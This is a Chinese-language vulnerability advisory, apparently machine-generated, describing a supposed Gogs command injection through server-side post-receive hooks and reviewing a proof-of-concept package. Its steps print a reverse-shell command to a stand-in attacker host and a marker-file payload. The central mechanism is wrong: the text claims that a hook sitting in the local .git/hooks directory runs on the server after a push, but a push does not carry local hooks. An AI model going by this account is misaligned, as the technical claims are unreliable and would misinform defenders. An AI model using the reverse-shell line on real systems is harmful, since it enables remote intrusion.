## Unknown - Gogs (self-hosted Git service) 命令注入

**漏洞编号:** Unknown

**漏洞类型:** 命令注入

**影响应用:** Gogs (self-hosted Git service)

**危害等级:** 高危

**CVSS评分:** N/A

**影响版本:** prior to 0.13.0

**利用条件:** 需要认证、需要对Git仓库的写权限

**POC 可用性:** 7

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

该漏洞（在现有信息中未指定CVE ID，但据POC描述影响Gogs 0.13.0版本之前）是一个存在于Gogs自托管Git服务中Git Hook机制的命令注入缺陷，具体针对`post-receive`钩子。Git Hook是Git在特定事件（如提交、推送或接收）前后自动执行的脚本。`post-receive`钩子在成功推送操作后在服务器端运行。此漏洞的核心在于，如果攻击者对运行在易受攻击Gogs实例上的仓库拥有推送权限，他们可以精心构造一个恶意的`post-receive`钩子脚本。当这些更改被推送到Gogs服务器时，由于服务器端会执行攻击者控制的`post-receive`钩子，导致任意命令注入，并最终在Gogs服务器上实现远程代码执行（RCE）。这是一个严重漏洞，因为它允许经认证的攻击者直接在托管Git服务的服务器上执行代码，可能导致整个系统的沦陷。该漏洞源于对Hook脚本中用户提供的内容缺乏足够的净化或验证，从而允许Shell命令被注入并执行。

所提供的概念验证（POC）代码在演示此命令注入漏洞的存在和可利用性方面非常有效。它包含一个`README.md`文件，详细说明了受影响的软件、漏洞类型和描述；一个`bash.sh`脚本，展示了一个典型的恶意有效载荷（反向Shell）；以及一个`exploit.py` Python脚本，模拟了恶意仓库的准备过程。`exploit.py`脚本具体说明了攻击者将如何构造恶意`post-receive`钩子。它创建一个临时目录，在其内部初始化一个伪Git仓库结构，将一个精心制作的`post-receive`脚本（包含`bash -c "id > /tmp/gogs_exploited"`命令）写入`.git/hooks`目录，然后设置其可执行权限。这个Python脚本成功演示了恶意构件的本地准备过程，一旦将其推送到易受攻击的Gogs服务器，就会触发远程代码执行。尽管Python脚本本身不执行向远程服务器的实际`git push`操作，但它完全验证了对恶意钩子如何形成和植入的概念性理解，使其成为一个稳健的概念验证。

利用此漏洞通常涉及以下步骤：
1.  **获取访问权限**：攻击者必须首先获取到目标Gogs服务器上至少一个仓库的合法推送访问凭证。这通常意味着需要事先进行身份验证。
2.  **本地仓库准备**：攻击者将目标仓库克隆到本地机器，或者在允许的情况下创建一个新的本地仓库。
3.  **构造恶意钩子**：在本地仓库中，攻击者进入`.git/hooks/`目录。如果`post-receive`钩子不存在，则创建它；否则，修改现有钩子。在此脚本中，攻击者嵌入任意Shell命令。例如，`bash -c "id > /tmp/gogs_exploited"`将执行`id`命令并将其输出保存到服务器上的文件`/tmp/gogs_exploited`。为了更直接的影响，`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"`将启动一个反向Shell连接，回连到攻击者在端口4444上监听的机器。
4.  **设置权限**：攻击者确保`post-receive`脚本具有可执行权限（例如，`chmod +x .git/hooks/post-receive`）。
5.  **推送更改**：攻击者然后提交更改（尽管钩子本身不需要提交，但其在本地机器`.git/hooks`中的存在是关键），并将其本地仓库推送到远程Gogs服务器。
6.  **远程代码执行**：收到推送后，Gogs服务器会自动执行`post-receive`钩子脚本。由于此脚本现在包含攻击者注入的命令，这些命令将在Gogs服务器上以Gogs应用程序的权限执行，从而导致远程代码执行。

与所提供的POC代码相关的投毒风险被评估为低风险（10%）。此评估基于对`README.md`、`bash.sh`和`exploit.py`文件的彻底审查。`exploit.py`脚本作为POC的可执行组件，其代码是透明的，并且仅使用标准的Python库（`os`、`subprocess`）。它专注于创建本地文件系统工件以演示漏洞机制，没有任何混淆、调用外部可疑域或尝试下载额外载荷的行为。`bash.sh`文件明确包含了一个反向Shell命令；然而，这被清楚地呈现为攻击者为实现RCE而注入的“示例载荷”，而不是POC工具本身中嵌入的隐藏恶意功能。指示明确警告不要将POC验证的后门代码误判为POC工具的“投毒”代码。鉴于这种清晰性以及没有观察到任何隐蔽或意外行为，该代码被认为是安全的，适用于防御性安全研究目的，前提是在受控环境中运行以观察其对目标（即Gogs服务器本身，而不是运行POC的机器）的预期效果。

**项目地址:** N/A

**漏洞详情:** N/A
